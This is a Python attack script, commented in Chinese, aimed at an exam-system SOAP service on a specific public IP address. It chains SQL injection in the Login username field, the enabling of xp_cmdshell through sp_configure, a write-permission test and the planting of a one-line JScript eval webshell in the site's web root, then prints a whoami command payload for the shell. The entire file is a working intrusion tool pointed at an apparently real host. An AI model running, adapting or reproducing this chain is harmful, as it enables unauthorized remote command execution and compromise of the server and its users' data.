import requests
import time

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
# 之前推断的 Web 根目录
WEB_ROOT = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web"
SHELL_FILENAME = "shell_v2.aspx"
TEST_FILENAME = "test_write.txt"

# 一句话木马 (JScript版，比较短，方便写入)
# 密码: c
# 用法: shell_v2.aspx?c=var d=new ActiveXObject("WScript.Shell");var o=d.Exec("cmd /c whoami");Response.Write(o.StdOut.ReadAll());
SHELL_CONTENT = r'<%@ Page Language="Jscript"%><%eval(Request.Item["c"],"unsafe");%>'

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def send_sql_payload(payload_name, sql_command):
    """
    发送包含 SQL 注入 Payload 的登录请求
    """
    print(f"[*] 发送 Payload [{payload_name}]...")

    # 构造 SQL 注入字符串
    # 原始 SQL: SELECT ... WHERE Code1='{username}'
    # 注入: admin'; {sql_command}; --
    # 注意: SQL 语句中的单引号需要转义为 ''

    injection = f"admin'; {sql_command} --"

    # XML 转义
    safe_username = injection.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")

    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <Login xmlns="http://tempuri.org/">
          <username>{safe_username}</username>
          <pwd>pass</pwd>
        </Login>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/Login"

        # 发送请求
        # 注意：xp_cmdshell 可能会阻塞，或者如果执行出错会报错，所以我们要容忍超时和 500 错误
        requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=5)
        print("    -> 发送完成")

    except requests.exceptions.Timeout:
        print("    -> 请求超时 (可能是命令正在执行，这是好迹象)")
    except Exception as e:
        # SQL注入常常会导致 500 错误，这通常是正常的
        pass

def enable_xp_cmdshell():
    print("=== 步骤 1: 开启 xp_cmdshell ===")
    # 开启高级选项
    send_sql_payload("Enable Advanced Options", "EXEC sp_configure 'show advanced options', 1; RECONFIGURE")
    # 开启 xp_cmdshell
    send_sql_payload("Enable xp_cmdshell", "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE")
    time.sleep(1)

def verify_write_permission():
    print(f"\n=== 步骤 2: 测试写入权限 ({TEST_FILENAME}) ===")
    # 构造 cmd 命令: echo test > path
    target_path = f"{WEB_ROOT}\\{TEST_FILENAME}"
    cmd = f"echo sql_injection_write_test > \"{target_path}\""

    # 转义 cmd 中的单引号 (如果有的话)
    sql_cmd = f"EXEC xp_cmdshell '{cmd}'"

    send_sql_payload("Write Test File", sql_cmd)

    # 验证
    test_url = f"http://120.55.241.236:999/{TEST_FILENAME}"
    print(f"    验证 URL: {test_url}")
    try:
        resp = requests.get(test_url, timeout=5)
        if resp.status_code == 200 and "sql_injection_write_test" in resp.text:
            print("    [★ SUCCESS] 写入成功！目录可写，且 xp_cmdshell 工作正常！")
            return True
        else:
            print(f"    [-] 验证失败: HTTP {resp.status_code}")
            return False
    except:
        print("    [!] 验证连接失败")
        return False

def write_webshell():
    print(f"\n=== 步骤 3: 写入 WebShell ({SHELL_FILENAME}) ===")
    target_path = f"{WEB_ROOT}\\{SHELL_FILENAME}"

    # 构造 echo 命令写入 Webshell
    # 需要处理特殊字符：< > %
    # 在 cmd 中，< > 需转义为 ^< ^>
    # % 在 echo 中通常不需要转义，但在某些环境中可能需要 %%
    # 这里我们使用一种稍微稳妥的方法：分段写入或使用 echo ^< ... ^>

    # Shell: <%@ Page Language="Jscript"%><%eval(Request.Item["c"],"unsafe");%>
    # Cmd转义: echo ^<^%@ Page Language="Jscript"%^>^<^%eval(Request.Item["c"],"unsafe");%^> > path

    # 注意：Shell内容里的双引号 " 在 SQL 语句中不需要转义，但在 cmd 字符串中可能需要注意
    # 我们的 SQL 是: EXEC xp_cmdshell 'cmd_string'
    # cmd_string 是: echo ... > path

    escaped_shell = SHELL_CONTENT.replace("<", "^<").replace(">", "^>")
    # 注意：在某些 cmd 环境下 % 不需要转义，除非在 bat 文件中。直接执行通常没问题。

    cmd = f"echo {escaped_shell} > \"{target_path}\""

    # SQL 转义: SQL 字符串中的单引号 ' 必须转义为 ''
    # 我们的命令里没有单引号，所以还好

    print(f"    Payload CMD: {cmd}")

    sql_cmd = f"EXEC xp_cmdshell '{cmd}'"
    send_sql_payload("Write WebShell", sql_cmd)

    # 验证
    shell_url = f"http://120.55.241.236:999/{SHELL_FILENAME}"
    print(f"\n[★] WebShell 已尝试写入: {shell_url}")
    print("    请尝试访问并测试。")
    print("    测试 Payload (JScript):")
    print(f'    {shell_url}?c=var d=new ActiveXObject("WScript.Shell");var o=d.Exec("cmd /c whoami");Response.Write(o.StdOut.ReadAll());')

if __name__ == "__main__":
    print("=== SQL 注入 -> xp_cmdshell -> 写文件利用脚本 ===")
    enable_xp_cmdshell()

    if verify_write_permission():
        write_webshell()
    else:
        print("\n[?] 测试写入失败。可能原因：")
        print("    1. 目录路径不对 (虽然 web.config 读取成功，但可能写权限受限)")
        print("    2. xp_cmdshell 无法开启或被拦截")
        print("    3. 数据库用户不是 sa (但配置文件说是 sa)")
        print("\n    尝试强制写入 WebShell ...")
        write_webshell()
